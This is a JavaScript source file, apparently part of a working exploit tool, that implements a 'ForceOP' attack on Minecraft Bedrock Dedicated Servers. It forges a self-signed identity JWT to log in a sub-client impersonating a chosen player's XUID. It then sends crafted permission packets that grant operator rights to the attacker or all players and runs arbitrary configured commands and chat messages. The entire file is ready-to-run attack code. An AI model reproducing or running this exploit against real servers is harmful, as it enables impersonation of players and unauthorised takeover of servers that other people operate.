const JWT = require("jsonwebtoken");
const crypto = require("crypto");
const UUID = require("uuid");
const { createClient } = require("bedrock-protocol");
const { AdventureFlags, CommandOriginType, CommandPermissionLevel, DeviceOS, InputModes, PacketIds, PermissionFlags, PermissionLevel, TextType } = require("./constants.js");
const BinaryStream = require("./BinaryStream.js");
const config = require("../config.json");

class Payload {
	botName = "ImpersonatedUser"
	subclientId = 1;

	/**
	 * @class
	 * @description Connect to a Bedrock Dedicated Server and use the ForceOP exploit with a given player XUID
	 * @param {string} targetXuid - The player XUID to impersonate that will be used to give ourselves operator
	 * @param {string} ip - The IP of the server to connect to
	 * @param {number} port - The port of the server to connect to
	 * @param {boolean} offline - If we should log in as an offline player
	 */
	constructor({ targetXuid, ip, port, offline = false }) {
		this.targetXuid = targetXuid;

		this.client = createClient({
			host: ip,
			port: port,
			profilesFolder: "./authCache/",
			offline: offline,
			// Incase 'offline' is set to true, the offline account will have a username of 'Test'
			username: "Test"
		});

		this.client.on("player_list", (playerList) => this.onPlayerList(playerList));
	}

	packetCount = 0;
	onPlayerList(playerList) {
		// The first PlayerList packet we receive only contains information about our current player, and the second PlayerList packet we receive contains info for all online players
		// If the 'opAll' config value is enabled, we will need to wait for the second PlayerList packet
		this.packetCount++;
		if(this.packetCount !== 2) return;

		console.log("We managed to get the PlayerList packet, we can now start the exploit");

		this.createSubClient();

		console.log("Sent the SubClientLogin packet, we can now give players Operator permissions");

		const records = playerList.records.records;
		for(const player of records) {
			if(!config.opAll && player.username !== this.client.username) continue;

			// In 1.19.10 the AdventureSettings packed was removed and was replaced by RequestPermissions
			if(this.client.versionGreaterThanOrEqualTo("1.19.10")) {
				console.log(`Sending RequestPermissions packet to give ${player.username} Operator`);
				this.sendRequestPermissions(player.entity_unique_id, 4);
			} else {
				console.log(`Sending AdventureSettings packet to give ${player.username} Operator`);
				this.sendAdventureSettings(player.entity_unique_id);
			}
		}

		console.log("Running final actions...");

		for(const command of config.commands) {
			this.sendCommandRequest(command);
		}

		for(const message of config.messages) {
			this.sendText(message);
		}

		setTimeout(() => {
			this.client.disconnect();
		}, 500);
	}

	createSubClient() {
		// https://github.com/PrismarineJS/bedrock-protocol/blob/master/src/handshake/keyExchange.js#L13
		const { privateKey, publicKey } = crypto.generateKeyPairSync("ec", { namedCurve: "secp384r1" });
		const privateKeyPEM = privateKey.export({ format: "pem", type: "sec1" });
		const publicKeyDER = publicKey.export({ format: "der", type: "spki" });
		const clientX509 = publicKeyDER.toString("base64");

		const JWTOptions = {
			algorithm: "ES384",
			noTimestamp: true,
			notBefore: 0,
			// Our self signed JWT we create will only be valid for the next twenty four hours
			expiresIn: 60 * 60 * 24,
			header: {
				x5u: clientX509,
				typ: undefined
			}
		};

		const certificateChain = {
			extraData: {
				XUID: this.targetXuid,
				displayName: this.botName,
				identity: UUID.v4()
			},
			identityPublicKey: clientX509,
		};

		const identity = JWT.sign(certificateChain, privateKeyPEM, JWTOptions);
		const chain = [ identity ];

		const steveSkin = require("minecraft-data")("bedrock_1.19.70").defaultSkin;
		const userChain = {
			...steveSkin,

			ClientRandomId: Date.now(),
			CurrentInputMode: InputModes.MOUSE,
			DefaultInputMode: InputModes.MOUSE,
			DeviceID: UUID.v4(),
			DeviceOS: DeviceOS.WINDOWS_10,
			PlatformOfflineId: "",
			PlatformOnlineId: "",
			PlatformUserId: UUID.v4(),
			PlayFabId: "",
			PrimaryUser: false,
			ThirdPartyName: this.botName,
			ThirdPartyNameOnly: false,
			TrustedSkin: true
		};

		const clientChain = JWT.sign(userChain, privateKeyPEM, JWTOptions);

		const packetHeader = new BinaryStream();
		packetHeader.writeVarInt(this.createPacketId(PacketIds.SUB_CLIENT_LOGIN, 0, this.subclientId));

		const packetData = new BinaryStream();
		packetData.writeLEString(JSON.stringify({ chain }));
		packetData.writeLEString(clientChain);

		packetHeader.writeVarInt(packetData.length);
		packetHeader.writeBuffer(packetData.toBuffer());

		this.client.sendBuffer(packetHeader.toBuffer());
	}

	sendText(message) {
		const packetHeader = new BinaryStream();
		packetHeader.writeVarInt(this.createPacketId(PacketIds.TEXT, 0, this.subclientId));

		const packetData = new BinaryStream();
		packetData.writeUInt8(TextType.CHAT); // Chat Type
		packetData.writeBool(false); // Needs Translation
		packetData.writeVarintString(this.botName); // Username
		packetData.writeVarintString(message); // Message
		packetData.writeVarintString(this.targetXuid); // XUID
		packetData.writeVarintString(""); // Platform Chat ID

		packetHeader.writeBuffer(packetData.toBuffer());
		this.client.sendBuffer(packetHeader.toBuffer());
	}

	sendAdventureSettings(uniqueId, permissionLevel = PermissionLevel.OPERATOR) {
		const packetHeader = new BinaryStream();
		packetHeader.writeVarInt(this.createPacketId(PacketIds.ADVENTURE_SETTINGS, 0, this.subclientId));

		const packetData = new BinaryStream();
		// Player Abilities
		// We can also use this to make other players no-clip
		packetData.writeVarInt(
			AdventureFlags.AUTO_JUMP
		);
		packetData.writeVarInt(CommandPermissionLevel.GAME_MASTER) // CommandPermissionLevel
		packetData.writeVarInt(447); // Permissions, unknown
		packetData.writeVarInt(permissionLevel); // PlayerPermissionLevel
		packetData.writeVarInt(0); // Abilities, unknown
		packetData.writeBigInt64LE(uniqueId); // Unique ID

		packetHeader.writeBuffer(packetData.toBuffer());
		this.client.sendBuffer(packetHeader.toBuffer());
	}

	sendCommandRequest(command) {
		const packetHeader = new BinaryStream();
		packetHeader.writeVarInt(this.createPacketId(PacketIds.COMMAND_REQUEST, 0, this.subclientId));

		const packetData = new BinaryStream();
		packetData.writeVarintString(command); // Command

		// Command Origin
		packetData.writeVarInt(CommandOriginType.PLAYER); // Origin Source
		packetData.writeUuid(UUID.v4()); // UUID
		packetData.writeVarintString(""); // Request ID

		packetData.writeBool(false); // Internal

		// The version field in the CommandRequest packet was added in 1.19.60
		if(this.client.versionGreaterThanOrEqualTo("1.19.60")) {
			packetData.writeVarInt(66); // Command Engine version
		}

		packetHeader.writeBuffer(packetData.toBuffer());
		this.client.sendBuffer(packetHeader.toBuffer());
	}

	sendRequestPermissions(uniqueId, permissionLevel = 4) {
		const packetHeader = new BinaryStream();
		packetHeader.writeVarInt(this.createPacketId(PacketIds.REQUEST_PERMISSIONS, 0, this.subclientId));

		const packetData = new BinaryStream();
		packetData.writeBigInt64LE(uniqueId); // Unique ID
		packetData.writeVarInt(permissionLevel); // Permission level, values here do not match the values of the PermissionLevel enum
		// Bitfield representation of available abilities
		packetData.writeUInt16LE(
			PermissionFlags.BUILD |
			PermissionFlags.MINE |
			PermissionFlags.DOORS_AND_SWITCHES |
			PermissionFlags.OPEN_CONTAINERS |
			PermissionFlags.ATTACK_PLAYERS |
			PermissionFlags.ATTACK_MOBS |
			PermissionFlags.OPERATOR |
			PermissionFlags.TELEPORT
		);

		packetHeader.writeBuffer(packetData.toBuffer());
		this.client.sendBuffer(packetHeader.toBuffer());
	}

	createPacketId(packetId, targetId = 0, senderId = 0) {
		return (packetId & 1023) |
			((targetId & 3) << 10) |
			((senderId & 3) << 12);
	}
}

module.exports = Payload;